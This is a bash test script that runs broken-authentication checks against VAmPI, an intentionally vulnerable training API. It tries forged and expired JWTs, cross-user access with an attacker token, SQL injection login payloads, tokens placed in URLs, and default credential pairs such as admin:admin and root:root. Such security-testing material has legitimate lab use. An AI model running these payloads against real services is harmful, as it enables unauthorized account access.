#!/bin/bash
# API Authentication Bypass tests
# Tools: curl, jq
# Targets: VAmPI authentication and protected endpoints
# Estimated duration: 1-2 minutes
set -uo pipefail

TARGET="${1:?Usage: 05-broken-auth.sh <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-http}://${TARGET}/vampi"

echo "[*] Broken Authentication test suite against VAmPI at ${TARGET}"
echo ""

# --- Helper ---
auth_test() {
  local label="$1"
  shift
  code=$(curl -sk -o /dev/null -w "%{http_code}" "$@" --max-time 10) || code="ERR"
  echo "    ${label} -> HTTP ${code}"
}

# --- 1. Access protected endpoint without Authorization header ---
echo "[+] Test 1: Access protected endpoints without auth"
auth_test "GET /users/v1 (no auth)" "${BASE}/users/v1"
auth_test "GET /users/v1/admin (no auth)" "${BASE}/users/v1/admin"

echo ""

# --- 2. Expired / invalid JWT tokens ---
echo "[+] Test 2: Invalid and expired JWT tokens"
FAKE_JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTAwMDAwMDAwMH0.invalid-signature"
EXPIRED_JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwMDAwMDAwMH0.fake-expired"

auth_test "GET /users/v1 (invalid JWT)" \
  -H "Authorization: Bearer ${FAKE_JWT}" "${BASE}/users/v1"

auth_test "GET /users/v1 (expired JWT)" \
  -H "Authorization: Bearer ${EXPIRED_JWT}" "${BASE}/users/v1"

echo ""

# --- 3. Register a user, then use their token for BOLA ---
echo "[+] Test 3: BOLA — access other users' resources with attacker token"

# Register
curl -sk -X POST "${BASE}/users/v1/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"authtest","password":"authtest123","email":"authtest@example.com"}' \
  --max-time 10 >/dev/null 2>&1 || true

# Login
LOGIN_RESP=$(curl -sk -X POST "${BASE}/users/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"authtest","password":"authtest123"}' \
  --max-time 10) || true

TOKEN=$(echo "$LOGIN_RESP" | jq -r '.auth_token // empty' 2>/dev/null || true)
if [[ -z "$TOKEN" ]]; then
  echo "[FAIL] Native authentication prerequisite failed" >&2
  exit 1
fi

for user in admin user1 root superadmin; do
  auth_test "GET /users/v1/${user} (BOLA with authtest token)" \
    -H "Authorization: Bearer ${TOKEN}" "${BASE}/users/v1/${user}"
done

echo ""

# --- 4. SQL injection in login credentials ---
echo "[+] Test 4: SQL injection in login"
SQLI_PAYLOADS=(
  '{"username":"admin'\'' OR 1=1--","password":"anything"}'
  '{"username":"admin","password":"'\'' OR '\''1'\''='\''1"}'
)

for payload in "${SQLI_PAYLOADS[@]}"; do
  auth_test "POST /login (SQLi: ${payload:0:40}...)" \
    -X POST "${BASE}/users/v1/login" \
    -H "Content-Type: application/json" \
    -d "${payload}"
done

echo ""

# --- 5. Token in URL parameter instead of header ---
echo "[+] Test 5: Token in URL query parameter"
auth_test "GET /users/v1?token=BEARER (token in URL)" \
  "${BASE}/users/v1?token=${TOKEN}"
auth_test "GET /users/v1?access_token=BEARER (access_token in URL)" \
  "${BASE}/users/v1?access_token=${TOKEN}"

echo ""

# --- 6. Default credentials ---
echo "[+] Test 6: Default credential pairs"
DEFAULT_CREDS=(
  "admin:admin"
  "admin:password"
  "admin:admin123"
  "root:root"
)

for cred in "${DEFAULT_CREDS[@]}"; do
  user="${cred%%:*}"
  pass="${cred##*:}"
  auth_test "POST /login ${user}/${pass}" \
    -X POST "${BASE}/users/v1/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"${user}\",\"password\":\"${pass}\"}"
done

echo ""
echo "[*] Broken Authentication test suite complete (12 test cases)"
